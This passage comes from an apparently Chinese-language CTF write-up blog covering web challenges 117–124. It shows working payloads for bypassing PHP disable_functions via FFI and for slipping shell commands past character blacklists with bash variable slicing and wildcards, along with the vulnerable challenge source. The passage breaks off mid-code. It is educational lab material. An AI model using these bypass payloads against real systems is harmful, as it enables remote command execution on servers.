class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">c=$a = new DirectoryIterator(&quot;glob:///*&quot;);<br>foreach($a as $f)&#123;<br>    echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);<br>&#125;;exit();<br></code></pre></td></tr></table></figure><p>hint è¯´æ˜¯ php7.4 çš„ [FFI]( <a href="https://www.php.net/manual/zh/ffi.cdef.php">https://www.php.net/manual/zh/ffi.cdef.php</a> <a href="https://www.php.cn/php-weizijiaocheng-415807.html">https://www.php.cn/php-weizijiaocheng-415807.html</a>)</p><p>è¿™ä¸ª <code>FFI</code> æ˜¯å¤–éƒ¨å‡½æ•°æ¥å£ï¼Œèƒ½åœ¨ php ä¸­å»è°ƒç”¨ C è¯­è¨€çš„å‡½æ•°</p><p>ç»•è¿‡å§¿åŠ¿ï¼š<a href="https://xz.aliyun.com/news/9507">bypass disable_functionså§¿åŠ¿æ€»ç»“</a> çš„åˆ©ç”¨ PHP7.4 FFI ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs url">c=<br>$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);<br>$ffi-&gt;system(&quot;/readflag /flag36x.txt &gt; /var/www/html/flagxx.txt&quot;);   <br>exit();<br></code></pre></td></tr></table></figure><p>ç„¶åè®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">url/flagxx.txt<br></code></pre></td></tr></table></figure><h1 id="Web-118"><a href="#Web-118" class="headerlink" title="Web 118"></a>Web 118</h1><p>åªæœ‰ä¸€ä¸ªè¾“å…¥æ¡†ï¼Œf12 å‘ç°æœ‰ä¸€å¥ <code>&lt;!-- system($code);--&gt;</code> ä¹Ÿå°±æ˜¯è¯´è¾“å…¥çš„å†…å®¹ä¼šè¢« <code>system()</code> å‡½æ•°æ‰§è¡Œï¼Œè€Œä¸”åªå‰©ä¸‹ <code>$</code>ã€<code>&#123;</code>ã€<code>&#125;</code>ã€<code>?</code> ã€<code>.</code> ã€<code>~</code> ç­‰ç­‰å­—ç¬¦å’Œå¤§å†™å­—æ¯æ²¡æœ‰è¢« ban</p><p>å¯ä»¥ç”¨è¿™äº›å­—ç¬¦æ„å»ºå‘½ä»¤ï¼š<a href="https://www.cnblogs.com/sparkdev/p/9934595.html#title_path">å¸¸è§ Bash å†…ç½®å˜é‡ä»‹ç»</a></p><p>æ¯”å¦‚ <code>$PATH</code>ã€<code>$PWD</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/c0b74c7d52bfc6f9.png"></p><p>ä¸Šé¢çš„ <code>$&#123;PATH:5:1&#125;$&#123;PATH:11:1&#125;</code> è¾“å‡ºäº† <code>ls</code> ï¼Œè¿™æ˜¯å› ä¸º Linux ä¸­çš„åˆ‡ç‰‡ï¼Œåœ¨ Linux ä¸­ï¼Œ<code>$&#123;var:offset:length&#125;</code> ä¸ºå­—ç¬¦ä¸²åˆ‡ç‰‡å½¢å¼ï¼Œå¦‚ä¸Šæ‰€ç¤ºã€‚å½“ <code>length</code> ä¸ºè´Ÿæ•°æ—¶ï¼Œä»å°¾éƒ¨å¼€å§‹è¾“å‡ºã€‚</p><p><code>$&#123;PATH:5:1&#125;$&#123;PATH:11:1&#125;</code> å°±æ˜¯åˆ©ç”¨çš„ <code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code> ä¸­ç¬¬ 6 ä½( offset +1)å­—ç¬¦  <code>l</code>  å’Œç¬¬ 12 ä½å­—ç¬¦  <code>s</code>ï¼Œç»„åˆè¾“å‡ºäº† <code>ls</code>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ æƒ³è¦çš„å‘½ä»¤è¾“å‡ºã€‚</p><p>ä½†æ˜¯æ•°å­—è¢« ban äº†ï¼Œæ— æ³•çŸ¥é“æŸä¸ªå­—ç¬¦ä½ç½®ï¼Œè¿™æ—¶å€™å°±èƒ½æƒ³åˆ°  Shell è¯­è¨€ä¸­çš„ <code>$(())</code>ï¼Œå®ƒæ˜¯ç­‰äº 0 çš„ï¼Œå–ååä¸º -1ï¼Œä½†æ˜¯ <code>()</code> ä¹Ÿè¢« banäº†ï¼Œæ²¡äº‹ï¼Œå¯ä»¥ç”¨ <code>$&#123;&#125;</code> </p><p>å¯¹ä¸€ä¸ªç©ºå˜é‡å–åå¯ä»¥æ‹¿åˆ°ä¸€æ ·çš„æ•ˆæœ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/home/butt3rf1y]<br>â””â”€# <span class="hljs-built_in">echo</span> $((N))<br>0<br><br>â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/home/butt3rf1y]<br>â””â”€# <span class="hljs-built_in">echo</span> $((~N))<br>-1<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸ª<code>nl</code> åˆ—å‡º flag å†…å®¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€# <span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;PATH:~N&#125;</span><br>n<br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨ <code>/var/www/html</code> ç›®å½•ä¸‹å¯ä»¥æ‹¿åˆ° <code>l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(rootã‰¿butt3rf1y)-[/var/www/html]<br>â””â”€# <span class="hljs-built_in">echo</span> <span class="hljs-variable">$&#123;PWD:~N&#125;</span><br>l<br></code></pre></td></tr></table></figure><p>è€Œæˆ‘ä»¬çš„ flag ç›´æ¥ç”¨é€šé…ç¬¦</p><p>ç»¼ä¸Šæ‰€è¿°ï¼Œpayload ä¸º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;PATH:~N&#125;<span class="hljs-variable">$&#123;PWD:~N&#125;</span> ????????</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æºä»£ç æ‰¾åˆ° flag</p><h1 id="Web-119"><a href="#Web-119" class="headerlink" title="Web 119"></a>Web 119</h1><h2 id="nl"><a href="#nl" class="headerlink" title="nl"></a>nl</h2><p>ç”¨ä¸Šä¸€ä¸ª payload å·²ç»ä¸è¡Œäº†ï¼Œ<code>PATH</code> è¢«ç¦äº†ï¼Œé‚£ä¹ˆç”¨ <code>PWD</code> å»æ„é€ ï¼Œç”¨ <code>whereis</code> å‘½ä»¤å¯ä»¥æ‰¾åˆ° <code>nl</code> æŒ‡ä»¤è·¯å¾„</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">â””â”€# whereis <span class="hljs-built_in">nl</span><br><span class="hljs-built_in">nl</span>: /usr/bin/nl<br></code></pre></td></tr></table></figure><p>å› ä¸º <code>PATH</code> ä¸èƒ½ç”¨ï¼Œé‚£å°±ç”¨é€šé…ç¬¦ <code>?</code>ï¼Œ<code>nl</code> å°±å¯ä»¥è¡¨ç¤ºä¸º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?$&#123;PWD:~N&#125;<br></code></pre></td></tr></table></figure><p>éœ€è¦å¸¦ä¸Šè·¯å¾„ <code>/usr/bin/</code>ï¼Œä½†æ˜¯ <code>/</code> å’Œå°å†™å­—æ¯ä¹Ÿè¢« ban äº†ï¼Œè¿˜æ˜¯å¯ä»¥ç”¨ <code>?</code> ä»£æ›¿</p><p>è€Œè¾“å‡º <code>$PWD</code> å°±èƒ½çŸ¥é“ç¬¬ä¸€ä½å°±æ˜¯ <code>/</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æˆªå–å‡ºæ¥ï¼Œå½“æˆ‘ä»¬ç”¨ <code>set</code> æŸ¥çœ‹ç¯å¢ƒå˜é‡çš„æ—¶å€™ä¼šå‘ç°</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">SHLVL=1<br></code></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬å¯ä»¥è¾“å‡º <code>SHLVL</code> æ¥è¡¨ç¤º 1</p><p>åœ¨ Linux ä¸­ï¼Œ<code>$&#123;&#125;</code> ä¸­å˜é‡å‰åŠ  <code>#</code> å¯ä»¥è·å–å­—ç¬¦ä¸²é•¿åº¦ï¼Œé‚£ä¹ˆå°±èƒ½è¡¨ç¤ºä¸ºå¦‚ä¸‹å½¢å¼</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;#SHLVL&#125;</span><br></code></pre></td></tr></table></figure><p>å› æ­¤æ„é€ å‡ºå½¢å¦‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;PWD::<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;???<span class="hljs-variable">$&#123;PWD::<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;</span>???<span class="hljs-variable">$&#123;PWD::<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;</span>?<span class="hljs-variable">$&#123;PWD:~N&#125;</span> ????????</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ª payload ä¸º :<code>/usr/bin/nl flag.xxx</code> å½¢å¼ï¼Œå› ä¸º æ•°å­—è¢« ban äº†ï¼Œæ‰€ä»¥ <code>$&#123;var:offset:length&#125;</code> å°±å¯ä»¥ç®€å†™æˆ <code>$&#123;var::length&#125;</code> è¡¨ç¤ºä» 0 å¼€å§‹</p><p><code>SHLVL</code> æ˜¯è®°å½•å¤šä¸ª Bash è¿›ç¨‹å®ä¾‹åµŒå¥—æ·±åº¦çš„ç´¯åŠ å™¨ï¼Œæ¯”å¦‚è¯´ç¬¬ä¸€æ¬¡æ‰“å¼€ shell æ—¶ <code>$SHLVL=1</code> ,ç„¶ååœ¨æ­¤ shell ä¸­å†æ‰“å¼€ä¸€ä¸ª shell æ—¶ <code>$SHLVL=2</code>ï¼Œå…¶å®å°±æ˜¯å¥—å¨ƒçš„æ•°é‡</p><h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h2><p>ç›¸åŒçš„æ­¥éª¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin/cat<br></code></pre></td></tr></table></figure><p>æ„é€ å‡º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;PWD:<span class="hljs-variable">$&#123;#&#125;</span>:<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;???<span class="hljs-variable">$&#123;PWD:<span class="hljs-variable">$&#123;#&#125;</span>:<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;</span>??<span class="hljs-variable">$&#123;HOME:<span class="hljs-variable">$&#123;#HOSTNAME&#125;</span>:<span class="hljs-variable">$&#123;#SHLVL&#125;</span>&#125;</span> ????????</span><br></code></pre></td></tr></table></figure><h1 id="Web-120"><a href="#Web-120" class="headerlink" title="Web 120"></a>Web 120</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>if(isset($_POST[&#x27;code&#x27;]))&#123;<br>    $code=$_POST[&#x27;code&#x27;];<br>    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    <br>        if(strlen($code)&gt;65)&#123;<br>            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>        else&#123;<br>        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>    &#125;<br>    else&#123;<br>     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;<br>    &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>ç»ˆäºæœ‰æºç äº†TVT</p><p>å› ä¸ºæœ‰äº†é•¿åº¦é™åˆ¶ä¸º 65ï¼Œä¹‹å‰çš„è¶…å‡ºé™åˆ¶äº†ï¼ŒæŠŠ <code>SHLVL</code> æ¢æˆå˜é‡ <code>#</code></p><p>äºæ˜¯ <code>$&#123;PWD::$&#123;SHLVL&#125;&#125;</code> -&gt; <code>$&#123;PWD::$&#123;##&#125;&#125;</code>æ„é€  payload</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">code=$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;?$&#123;PWD:~N&#125; ????????<br></code></pre></td></tr></table></figure><h1 id="Web-121"><a href="#Web-121" class="headerlink" title="Web 121"></a>Web 121</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>if(isset($_POST[&#x27;code&#x27;]))&#123;<br>    $code=$_POST[&#x27;code&#x27;];<br>    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    <br>        if(strlen($code)&gt;65)&#123;<br>            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>        else&#123;<br>        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>    &#125;<br>    else&#123;<br>     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;<br>    &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>ban äº†å¾ˆå¤šï¼Œä½†æ˜¯è¿˜æ˜¯èƒ½ç”¨ <code>PWD</code> ï¼Œç”¨  <code>/???/r??</code> æ„é€ å‡ºè·¯å¾„  <code>bin/rev</code>  æ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">code=$&#123;PWD::$&#123;##&#125;&#125;???$&#123;PWD::$&#123;##&#125;&#125;$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?? ????????<br></code></pre></td></tr></table></figure><p>ç„¶å</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;galf&quot;</span> | rev<br></code></pre></td></tr></table></figure><h1 id="Web-122"><a href="#Web-122" class="headerlink" title="Web 122"></a>Web 122</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>error_reporting(0);<br>highlight_file(__FILE__);<br>if(isset($_POST[&#x27;code&#x27;]))&#123;<br>    $code=$_POST[&#x27;code&#x27;];<br>    if(!preg_match(&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;, $code))&#123;    <br>        if(strlen($code)&gt;65)&#123;<br>            echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.&#x27;you are so long , I dont like &#x27;.&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>        else&#123;<br>        echo &#x27;&lt;div align=&quot;center&quot;&gt;&#x27;.system($code).&#x27;&lt;/div&gt;&#x27;;<br>        &#125;<br>    &#125;<br>    else&#123;<br>     echo &#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;;<br>    &#125;<br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p><code>PWD</code> å’Œ <code>#</code> éƒ½ä¸èƒ½ç”¨äº†ï¼Œhint ç»™çš„</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby">é€šè¿‡<span class="hljs-variable">$?</span>æ¥å®ç°çš„ï¼Œ<span class="hljs-variable">$?</span>æ˜¯è¡¨ç¤ºä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œç»“æŸåçš„ä¼ å›å€¼ã€‚é€šå¸¸<span class="hljs-number">0</span>ä»£è¡¨æ‰§è¡ŒæˆåŠŸï¼Œé<span class="hljs-number">0</span>ä»£è¡¨æ‰§è¡Œæœ‰è¯¯<br><br><span class="hljs-symbol">payload:</span>code=&lt;A;<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">HOME</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">HOME</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125;<span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">?$</span>&#123;<span class="hljs-variable constant_">RANDOM</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span><span class="hljs-variable">$?</span>&#125; <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?<br><span class="hljs-comment">#å¯èƒ½å­˜åœ¨æˆåŠŸçš„æœºä¼šï¼Œä¸æ–­åˆ·æ–°</span><br></code></pre></td></tr></table></figure><p>éšæœºï¼Œä¸€ç›´åˆ·æ–°å°±èƒ½å‡ºæ¥</p><p><code>&lt;A</code> æ˜¯å°† A æ–‡ä»¶å¤¹å†…çš„å‘½ä»¤é‡å®šå‘åˆ°ç»ˆç«¯è¿›è¡Œæ‰§è¡Œï¼Œç”±äºæ²¡æœ‰æ–‡ä»¶ A è‚¯å®šå°±ä¼šæŠ¥é”™ï¼Œé‚£ä¹ˆ <code>$?</code> å°±ä¸º 1ï¼Œç”¨ <code>$&#123;HOME::$?&#125;</code> å¾—åˆ° <code>/</code>ï¼Œå†ç”¨ <code>RANDOM</code> éšæœºæ•°éšæœºåˆ° 4 å°±èƒ½æ‰§è¡Œ <code>/bin/base64</code></p><h1 id="Web-124"><a href="#Web-124" class="headerlink" title="Web 124"></a>Web 124</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: æ”¶é›†è‡ªç½‘ç»œ<br># @Date:   2020-09-16 11:25:09<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-10-06 14:04:45<br><br>*/<br><br>error_reporting(0);<br>//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag<br>if(!isset($_GET[&#x27;c&#x27;]))&#123;<br>    show_source(__FILE__);<br>&#125;else&#123;<br>    //ä¾‹å­ c=20-1<br>    $content = $_GET[&#x27;c&#x27;];<br>    if (strlen($content) &gt;= 80) &#123;<br>        die(&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;);<br>    &#125;<br>    $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];<br>    foreach ($blacklist as $blackitem) &#123;<br>        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123;<br>            die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;);<br>        &#125;<br>    &#125;<br>    //å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp<br>    $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];<br>    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);  <br>    foreach ($used_funcs[0] as $func) &#123;<br>        if (!in_array($func, $whitelist)) &#123;<br>            die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;);<br>        &#125;<br>    &#125;<br>    //å¸®ä½ ç®—å‡ºç­”æ¡ˆ<br>    eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);<br>&#125;<br></code></pre></td></tr></table></figure><p>åªèƒ½ç”¨ç™½åå•é‡Œçš„è¿™äº›å‡½æ•°ï¼Œéƒ½æ˜¯ä¸€äº› Math å‡½æ•°ï¼Œé‡Œé¢æœ‰å¾ˆå¤šè¿›åˆ¶è½¬æ¢çš„å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php">base_convert-åœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—<br><span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$num</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$from_base</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$to_base</span>): <span class="hljs-keyword">string</span><br><br>bindec-äºŒè¿›åˆ¶è½¬åè¿›åˆ¶<br><span class="hljs-title function_ invoke__">bindec</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$binary_string</span>): <span class="hljs-keyword">int</span>|<span class="hljs-keyword">float</span><br>    <br>decbin-åè¿›åˆ¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶<br><span class="hljs-title function_ invoke__">decbin</span>(<span class="hljs-keyword">int</span> <span class="hljs-variable">$num</span>): <span class="hljs-keyword">string</span><br><br>dechex-åè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶<br><span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-keyword">int</span> <span class="hljs-variable">$num</span>): <span class="hljs-keyword">string</span><br>    <br>decoct-åè¿›åˆ¶è½¬æ¢ä¸ºå…«è¿›åˆ¶<br><span class="hljs-title function_ invoke__">decoct</span>(<span class="hljs-keyword">int</span> <span class="hljs-variable">$num</span>): <span class="hljs-keyword">string</span><br><br>hexdec-åå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶<br><span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$hex_string</span>): <span class="hljs-keyword">int</span>|<span class="hljs-keyword">float</span><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬åªèƒ½æ„é€ å‡½æ•°æˆ–æ„é€ å­—æ¯ï¼Œ<code>base_convert()</code> å‡½æ•°èƒ½å®ç°ä»»æ„è¿›åˆ¶è½¬æ¢ï¼Œåœ¨ 36 è¿›åˆ¶ä¸­åŒ…å«äº†æ‰€æœ‰çš„æ•°å­—å’Œå­—æ¯ï¼Œæ‰€ä»¥åªéœ€è¦å°†æ„é€ å‡º <code>hex2bin</code> å‡½æ•°ï¼Œç„¶åå†ç”¨ <code>hexdex</code> å‡½æ•°è½¬æ¢æˆåè¿›åˆ¶ï¼Œå½“æˆ‘ä»¬æ„é€ çš„æ—¶å€™éœ€è¦åè¿‡æ¥æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-string">&#x27;hex2bin&#x27;</span>, <span class="hljs-number">36</span>, <span class="hljs-number">10</span>);<br>&gt;&gt;<span class="hljs-number">37907361743</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span 